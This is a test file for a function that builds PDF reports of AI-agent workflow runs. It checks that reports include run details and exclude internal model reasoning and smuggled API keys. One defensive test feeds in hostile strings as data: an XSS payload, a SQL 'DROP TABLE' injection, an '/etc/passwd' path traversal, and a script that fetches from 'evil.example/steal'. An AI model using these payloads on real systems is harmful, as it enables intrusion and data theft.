import { jsPDF } from "jspdf";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import type {
  AgentIteration,
  ApprovalRequest,
  EvidenceItem,
  ExecutionEvent,
  RunSummary,
  TaskSummary,
  ToolInvocation
} from "../src/lib/api";
import { buildExecutionReportPdf, type ExecutionReportInput } from "../src/lib/pdfReport";

function baseRun(overrides: Partial<RunSummary> = {}): RunSummary {
  return {
    id: "01a06109-aaaa-7abc-9def-000000000001",
    tenant_id: "tenant-alice",
    workspace_id: "workspace-security-demo",
    workflow_version_id: "wf-1",
    workflow_name: "Bounded Agent Demo",
    objective: "Demonstrate bounded agentic workflow with fake model, local tools, citations, and zero cost.",
    status: "succeeded",
    engine_kind: "custom",
    engine_version: "custom-agent-v1",
    engine_metadata: {},
    version: 3,
    ...overrides
  };
}

function baseTask(overrides: Partial<TaskSummary> = {}): TaskSummary {
  return {
    id: "task-1",
    step_key: "investigate",
    name: "Run bounded agent investigation",
    kind: "agent",
    status: "succeeded",
    version: 1,
    result: null,
    ...overrides
  };
}

function baseEvent(overrides: Partial<ExecutionEvent> = {}): ExecutionEvent {
  return {
    id: "event-1",
    run_id: "01a06109-aaaa-7abc-9def-000000000001",
    task_id: null,
    event_type: "run.created",
    schema_version: 1,
    sequence: 1,
    aggregate_type: "run",
    aggregate_id: "01a06109-aaaa-7abc-9def-000000000001",
    actor_id: "actor-alice",
    causation_id: null,
    correlation_id: "corr-abc-123",
    payload: {},
    trace_context: {},
    sanitized_diff: {},
    retention_class: "standard",
    payload_hash: "hash-abc",
    catalog_known: true,
    created_at: "2026-09-03T13:00:00.000Z",
    ...overrides
  };
}

function baseInvocation(overrides: Partial<ToolInvocation> = {}): ToolInvocation {
  return {
    id: "inv-1",
    run_id: "01a06109-aaaa-7abc-9def-000000000001",
    task_id: "task-1",
    tool_name: "customer_reports.search",
    tool_version: 1,
    status: "succeeded",
    risk: "read_only",
    action_hash: "abc123def4560000000000000000000000000000000000000000000000",
    idempotency_key: "idem-1",
    error_type: null,
    error_message: null,
    created_at: "2026-09-03T13:00:01.000Z",
    completed_at: "2026-09-03T13:00:02.000Z",
    ...overrides
  };
}

function baseEvidence(overrides: Partial<EvidenceItem> = {}): EvidenceItem {
  return {
    id: "evidence-1",
    run_id: "01a06109-aaaa-7abc-9def-000000000001",
    task_id: "task-1",
    tool_invocation_id: "inv-1",
    source_type: "tool_output",
    source_name: "customer_reports.search",
    trust_label: "untrusted_tool_output",
    summary: { record_count: 3 },
    content_hash: "content-hash-000",
    created_at: "2026-09-03T13:00:02.000Z",
    ...overrides
  };
}

function baseApproval(overrides: Partial<ApprovalRequest> = {}): ApprovalRequest {
  return {
    id: "approval-1",
    tenant_id: "tenant-alice",
    workspace_id: "workspace-security-demo",
    run_id: "01a06109-aaaa-7abc-9def-000000000001",
    task_id: "task-2",
    tool_invocation_id: "inv-2",
    requester_id: "actor-alice",
    action_hash: "approval-hash-000",
    binding_hash: "binding-hash-000",
    risk: "simulated_effect",
    reason: "simulated_effect_requires_human_approval",
    action_summary: { tool_name: "ticket.create_simulated", arguments: { title: "Review result" } },
    status: "approved",
    request_version: 1,
    expires_at: "2026-09-03T14:00:00.000Z",
    decided_by: "actor-ava",
    decided_at: "2026-09-03T13:05:00.000Z",
    decision_reason: "Ava approves the exact local simulated action.",
    consumed_at: "2026-09-03T13:05:01.000Z",
    created_at: "2026-09-03T13:04:00.000Z",
    ...overrides
  };
}

function baseIteration(overrides: Partial<AgentIteration> = {}): AgentIteration {
  return {
    id: "iteration-1",
    run_id: "01a06109-aaaa-7abc-9def-000000000001",
    task_id: "task-1",
    attempt_id: "attempt-1",
    iteration_number: 1,
    model_call_id: "model-call-1",
    decision_type: "complete",
    decision_status: "validated",
    context_hash: "context-hash-000",
    counters_snapshot: {
      budgets: { max_iterations: 4, max_tool_calls: 2 },
      tool_calls_used: 1
    },
    decision: { decision: "complete", rationale: "internal model reasoning that must not leak" },
    validation_errors: [],
    result: {},
    created_at: "2026-09-03T13:00:03.000Z",
    ...overrides
  };
}

function baseInput(overrides: Partial<ExecutionReportInput> = {}): ExecutionReportInput {
  return {
    actor: { display_name: "Alice Admin", email: "alice@forge.local" },
    run: baseRun(),
    tasks: [baseTask()],
    events: [baseEvent()],
    toolInvocations: [baseInvocation()],
    evidenceItems: [baseEvidence()],
    approvals: [baseApproval()],
    agentIterations: [baseIteration()],
    generatedAt: new Date("2026-09-03T13:10:00.000Z"),
    ...overrides
  };
}

/**
 * Collects every string drawn onto the PDF so tests can assert on rendered
 * content without parsing PDF bytes. jsPDF assigns `text` as an own
 * property per instance, so the instance must exist before it's spied on —
 * this builds one, spies on it, then passes it into the (test-only)
 * injectable `doc` parameter.
 */
function collectRenderedText(input: ExecutionReportInput): string[] {
  const doc = new jsPDF({ unit: "pt", format: "letter" });
  const rendered: string[] = [];
  vi.spyOn(doc, "text").mockImplementation(function (this: jsPDF, text: string | string[]) {
    if (Array.isArray(text)) rendered.push(...text);
    else rendered.push(text);
    return this;
  } as unknown as typeof doc.text);

  buildExecutionReportPdf(input, doc);
  return rendered;
}

describe("buildExecutionReportPdf", () => {
  afterEach(() => {
    vi.restoreAllMocks();
  });

  it("includes the run id, objective, status, and trace/correlation id", () => {
    const joined = collectRenderedText(baseInput()).join(" | ");

    expect(joined).toContain("01a06109-aaaa-7abc-9def-000000000001");
    expect(joined).toContain("Demonstrate bounded agentic workflow");
    expect(joined).toContain("corr-abc-123");
  });

  it("includes tool actions, approval decisions, and evidence references", () => {
    const joined = collectRenderedText(baseInput()).join(" | ");

    expect(joined).toContain("customer_reports.search");
    expect(joined).toContain("approved");
    expect(joined).toContain("content-hash-000");
  });

  it("never includes the agent's internal decision rationale text", () => {
    const joined = collectRenderedText(baseInput()).join(" | ");

    expect(joined).not.toContain("internal model reasoning that must not leak");
  });

  it("returns a real jsPDF document with page-numbered footers", () => {
    const doc = buildExecutionReportPdf(baseInput());
    expect(doc.getNumberOfPages()).toBeGreaterThanOrEqual(1);
  });

  it("produces multiple pages for a run with a large number of tasks", () => {
    const manyTasks = Array.from({ length: 80 }, (_, i) =>
      baseTask({ id: `task-${i}`, step_key: `step_${i}`, name: `Step number ${i}` })
    );
    const doc = buildExecutionReportPdf(baseInput({ tasks: manyTasks }));
    expect(doc.getNumberOfPages()).toBeGreaterThan(1);
  });

  it("renders hostile model/tool/MCP-style content as inert text without throwing", () => {
    const hostileEvidence = baseEvidence({
      summary: {
        note: "<img src=x onerror=alert(1)>'; DROP TABLE users; -- ../../../etc/passwd"
      }
    });
    const hostileApproval = baseApproval({
      action_summary: { title: "<script>fetch('https://evil.example/steal')</script>" }
    });

    const input = baseInput({ evidenceItems: [hostileEvidence], approvals: [hostileApproval] });
    expect(() => buildExecutionReportPdf(input)).not.toThrow();

    const joined = collectRenderedText(input).join(" | ");
    // The hostile string appears only as literal, inert glyphs (jsPDF never parses/executes it).
    expect(joined).toContain("script");
    expect(joined).toContain("DROP TABLE");
  });

  it("does not leak a value smuggled onto an object under a field the report never reads", () => {
    const withSmuggledSecret = baseInvocation({
      // @ts-expect-error intentionally attaching an unexpected field to prove it is never read
      hidden_api_key: "sk-should-never-appear-in-report"
    });

    const joined = collectRenderedText(baseInput({ toolInvocations: [withSmuggledSecret] })).join(" | ");
    expect(joined).not.toContain("sk-should-never-appear-in-report");
  });

  it("reflects only the data passed in — an unauthorized/scoped-out actor's empty fetch produces an empty report, not fabricated content", () => {
    const restricted = baseInput({
      toolInvocations: [],
      evidenceItems: [],
      approvals: [],
      agentIterations: []
    });
    const joined = collectRenderedText(restricted).join(" | ");

    expect(joined).toContain("No tool invocations recorded");
    expect(joined).toContain("No evidence items were recorded");
    expect(joined).toContain("No approval requests were required");
  });

  it("labels a failed run's outcome distinctly from a succeeded one", () => {
    const failed = collectRenderedText(baseInput({ run: baseRun({ status: "failed" }) })).join(" | ");
    const succeeded = collectRenderedText(baseInput()).join(" | ");

    expect(failed).toContain("This run failed");
    expect(succeeded).toContain("completed successfully");
    expect(failed).not.toContain("completed successfully");
  });
});
